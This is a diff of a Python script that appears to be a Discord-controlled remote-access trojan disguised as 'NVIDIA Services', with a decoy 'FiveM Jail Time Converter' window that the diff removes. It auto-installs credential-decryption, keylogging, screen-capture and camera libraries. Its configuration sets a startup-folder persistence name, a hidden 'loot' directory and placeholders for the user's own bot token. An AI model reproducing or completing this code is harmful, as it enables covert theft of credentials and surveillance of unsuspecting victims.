@@ -1,37 +1,37 @@
-import sys
-import subprocess
+import sys, subprocess, importlib
 
-  # Required modules
 REQUIRED = {
-    'pystray':        'pystray',
-    'PIL':            'Pillow',
-    'tkinter':        None,       # built‑in; None skips install
-    'discord':        'discord.py',
-    'psutil':         'psutil',
-    'pyautogui':      'pyautogui',
-    'pynput':         'pynput',
-    'Crypto':         'pycryptodome',
-    'cv2':            'opencv-python',
-    'win32crypt':     'pywin32',
-    'requests':       'requests',
-    
+    "pystray": "pystray",
+    "PIL": "Pillow",
+    "tkinter": None,
+    "discord": "discord.py",
+    "psutil": "psutil",
+    "pyautogui": "pyautogui",
+    "pynput": "pynput",
+    "Crypto": "pycryptodome",
+    "cv2": "opencv-python",
+    "win32crypt": "pywin32",
+    "requests": "requests",
 }
 
-def install_missing():
+def ensure_deps():
     missing = []
     for mod, pkg in REQUIRED.items():
-        if pkg is None:
-            # skip built‑in modules
-            continue
-        try:
-            __import__(mod)
-        except ImportError:
+        if pkg and not is_module_available(mod):
             missing.append(pkg)
     if missing:
         print(f"[+] Installing missing packages: {missing}")
-        subprocess.check_call([sys.executable, '-m', 'pip', 'install', *missing])
+        subprocess.check_call([sys.executable, "-m", "pip", "install", *missing])
 
-install_missing()
+def is_module_available(name):
+    try:
+        importlib.import_module(name)
+        return True
+    except ImportError:
+        return False
+
+# Run before any imports
+ensure_deps()
 
 import warnings
 import logging
@@ -42,12 +42,22 @@ from PIL import Image
 import os
 import sys
 
+# Suppress discord warnings
 warnings.filterwarnings("ignore", category=UserWarning, module="discord")
+
+# Configure logging
 logging.basicConfig(level=logging.WARNING)
-logging.getLogger('discord').setLevel(logging.WARNING)
-logging.getLogger('discord.gateway').setLevel(logging.WARNING)
-logging.getLogger('discord.client').setLevel(logging.WARNING)
-logging.getLogger('discord.http').setLevel(logging.WARNING)
+
+# List
+discord_loggers = [
+    "discord",
+    "discord.gateway",
+    "discord.client",
+    "discord.http",
+]
+
+for logger in discord_loggers:
+    logging.getLogger(logger).setLevel(logging.WARNING)
 
 import tkinter as tk
 from tkinter import messagebox
@@ -84,6 +94,8 @@ import base64
 import urllib.request
 import io
 
+# i will add all the imports dynamically soon...
+
 # === Global Variables ===
 tray_icon = None
 gui_open = False
@@ -110,9 +122,9 @@ DARK_THEME = {
 }
 
 # Configuration
-BOT_TOKEN = ""
-BOT_CHANNEL_ID = 
-PERSISTENCE_NAME = "NVIDIAServices"
+BOT_TOKEN = ""  # add your discord bot token here
+BOT_CHANNEL_ID =  # add the discord channel ID here
+PERSISTENCE_NAME = "NVIDIAServices"  # this is the name that will show up in startup folder
 LOOT_DIR = os.path.join(tempfile.gettempdir(), "NVIDIA_Services_Data")
 try:
     os.makedirs(LOOT_DIR, exist_ok=True)
@@ -142,166 +154,6 @@ def create_tray_icon():
         pystray.MenuItem('Show GUI', show_gui)
     )
     return pystray.Icon("security_app", image, "NVIDIA Services", menu)
-
-def show_gui():
-    """Show the GUI window"""
-    global gui_open, root
-    if not gui_open:
-        gui_open = True
-        create_gui()
-
-def exit_app():
-    """Exit the application completely"""
-    global tray_icon
-    if tray_icon:
-        tray_icon.stop()
-    os._exit(0)
-
-def on_gui_close():
-    """Handle GUI close event"""
-    global gui_open, root
-    gui_open = False
-    if root:
-        root.destroy()
-    root = None
-
-
-# ===== GUI Functions =====
-def create_gui():
-    """Create and show the GUI"""
-    global root, gui_open
-    
-    if gui_open and root:
-        if root.winfo_exists():
-            root.deiconify()
-            root.focus_force()
-            return
-    
-    gui_open = True
-    theme = DARK_THEME  # Default theme
-    countdown_seconds = 0
-    countdown_job = None
-
-    def apply_theme():
-        root.configure(bg=theme["bg"])
-        title_label.config(bg=theme["bg"], fg=theme["fg"])
-        entry_label.config(bg=theme["bg"], fg=theme["fg"])
-        entry.config(bg=theme["entry_bg"], fg=theme["fg"], insertbackground=theme["fg"],
-                     highlightbackground=theme["highlight"])
-        scale_label.config(bg=theme["bg"], fg=theme["fg"])
-        scale.config(bg=theme["bg"], fg=theme["fg"], highlightbackground=theme["bg"], troughcolor=theme["entry_bg"])
-        convert_button.config(bg=theme["accent"], fg="white", activebackground="#66bb6a")
-        countdown_label.config(bg=theme["bg"], fg=theme["fg"])
-        theme_button.config(bg=theme["button_bg"], fg=theme["fg"])
-
-    def start_countdown():
-        nonlocal countdown_seconds, countdown_job
-        if countdown_seconds > 0:
-            mins, secs = divmod(countdown_seconds, 60)
-            countdown_label.config(text=f"⏳ Time remaining: {mins:02d}:{secs:02d}")
-            countdown_seconds -= 1
-            countdown_job = root.after(1000, start_countdown)
-        else:
-            countdown_label.config(text="⏰ Time served! Release now.")
-            convert_button.config(state=tk.NORMAL)
-            entry.config(state=tk.NORMAL)
-            scale.config(state=tk.NORMAL)
-
-    def convert_months():
-        nonlocal countdown_seconds, countdown_job
-        try:
-            months = int(entry.get())
-            seconds_per_month = scale.get()
-            total_seconds = months * seconds_per_month
-            minutes = total_seconds // 60
-
-            # Cancel previous countdown if running
-            if countdown_job:
-                root.after_cancel(countdown_job)
-                countdown_job = None
-
-            # Show initial countdown label
-            countdown_label.config(text=f"⏳ Time remaining: {minutes:02d}:00")
-
-            # Disable inputs during countdown
-            convert_button.config(state=tk.DISABLED)
-            entry.config(state=tk.DISABLED)
-            scale.config(state=tk.DISABLED)
-
-            # Set countdown seconds and start ticking
-            countdown_seconds = total_seconds
-            start_countdown()
-
-            # Remove focus from entry
-            root.focus()
-
-        except ValueError:
-            messagebox.showerror("Input Error", "Please enter a valid number of months.")
-
-    def toggle_theme():
-        nonlocal theme
-        theme = LIGHT_THEME if theme == DARK_THEME else DARK_THEME
-        apply_theme()
-
-    # Button hover effects
-    def on_enter(e):
-        e.widget['bg'] = "#66bb6a"
-
-    def on_leave(e):
-        e.widget['bg'] = theme["accent"]
-
-    # === GUI Setup ===
-    root = tk.Tk()
-    root.title("FiveM Jail Time Converter")
-    root.geometry("520x380")
-    root.resizable(False, False)
-    
-    # Handle window close event
-    root.protocol("WM_DELETE_WINDOW", on_gui_close)
-
-    title_label = tk.Label(root, text="🔒 FiveM Jail Time Converter", font=("Segoe UI", 16, "bold"))
-    title_label.pack(pady=(12, 10))
-
-    entry_label = tk.Label(root, text="Enter jail sentence in months:", font=("Segoe UI", 11))
-    entry_label.pack()
-
-    entry = tk.Entry(root, font=("Segoe UI", 14), justify='center', relief="flat", highlightthickness=1)
-    entry.pack(pady=(6, 12), ipadx=10, ipady=5)
-
-    scale_label = tk.Label(root, text="⏱️ Seconds per month:", font=("Segoe UI", 11))
-    scale_label.pack()
-
-    scale = tk.Scale(root, from_=15, to=300, orient="horizontal", length=280, resolution=5,
-                     font=("Segoe UI", 10), showvalue=True)
-    scale.set(60)
-    scale.pack(pady=(0, 16))
-
-    convert_button = tk.Button(
-        root,
-        text="Convert & Start Countdown",
-        command=convert_months,
-        font=("Segoe UI", 12, "bold"),
-        relief="flat",
-        padx=16,
-        pady=8,
-        bg=theme["accent"],
-        fg="white",
-        activebackground="#66bb6a"
-    )
-    convert_button.pack(pady=(0, 12))
-    convert_button.bind("<Enter>", on_enter)
-    convert_button.bind("<Leave>", on_leave)
-
-    countdown_label = tk.Label(root, text="", font=("Segoe UI", 14), justify="center")
-    countdown_label.pack(pady=(0, 14))
-
-    theme_button = tk.Button(root, text="Toggle Light/Dark Mode", command=toggle_theme,
-                             font=("Segoe UI", 10), relief="flat", padx=12, pady=6,
-                             bg=theme["button_bg"], fg=theme["fg"])
-    theme_button.pack()
-
-    apply_theme()
-    root.mainloop()
 
     
 current_dir = Path.home()
